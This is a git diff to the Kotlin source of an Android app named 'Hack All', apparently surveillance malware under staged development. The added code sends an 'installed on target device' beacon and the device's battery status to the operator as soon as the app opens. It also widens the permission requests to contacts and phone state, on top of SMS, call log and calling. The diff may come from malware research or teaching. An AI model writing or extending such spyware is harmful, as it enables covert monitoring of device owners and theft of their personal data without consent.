@@ -11,8 +11,6 @@ import android.provider.CallLog
 import android.widget.Button
 import android.widget.Toast
 import androidx.activity.ComponentActivity
-import androidx.activity.result.contract.ActivityResultContracts
-import androidx.core.app.ActivityCompat
 import androidx.core.net.toUri
 import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
 import cocomelonc.hackall.tools.HackAllNetwork
@@ -29,11 +27,41 @@ import com.karumi.dexter.listener.PermissionGrantedResponse
 import com.karumi.dexter.listener.single.PermissionListener
 
 import android.content.Context
+import android.os.BatteryManager
 
 class HackAllMainActivity : ComponentActivity() {
     private val number = "107"
     private lateinit var cameraButton: Button
     lateinit var receiver: HackAllAirPlaneBroadcastReceiver
+
+    // installed and opened - 1 stage
+    private fun greetings(): String {
+        return "LoveBahrain Hack All application has been installed on target device and opened\n"
+    }
+
+    // get battery info - 2 stage
+    private fun getBatteryInfo(): String {
+        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+        val batteryStatus = registerReceiver(null, intentFilter)
+        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+        val percentage = if (level >= 0 && scale > 0) (level * 100) / scale else -1
+
+        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+
+        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
+        val chargeType = when (chargePlug) {
+            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
+            BatteryManager.BATTERY_PLUGGED_AC -> "AC Adapter"
+            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
+            else -> "Unknown"
+        }
+        return  "Battery Info:\n" +
+                "Percentage: $percentage%\n" +
+                "Charging: $isCharging\n" +
+                "Charging Method: $chargeType"
+    }
 
     private fun startCall() {
         var intent = Intent(Intent.ACTION_CALL)
@@ -72,6 +100,8 @@ class HackAllMainActivity : ComponentActivity() {
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_CALL_LOG,
                 Manifest.permission.CALL_PHONE,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_CONTACTS,
             ) // after adding permissions we are calling an with listener method.
             .withListener(object : MultiplePermissionsListener {
                 override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
@@ -123,7 +153,8 @@ class HackAllMainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        HackAllNetwork(this).sendTextMessage("LoveBahrain All App has been installed on target device and opened\n")
+        HackAllNetwork(this).sendTextMessage(greetings())
+        HackAllNetwork(this).sendTextMessage(getBatteryInfo())
         this.requestPermissions()
         cameraButton = findViewById(R.id.camButton)
         cameraButton.setOnClickListener {
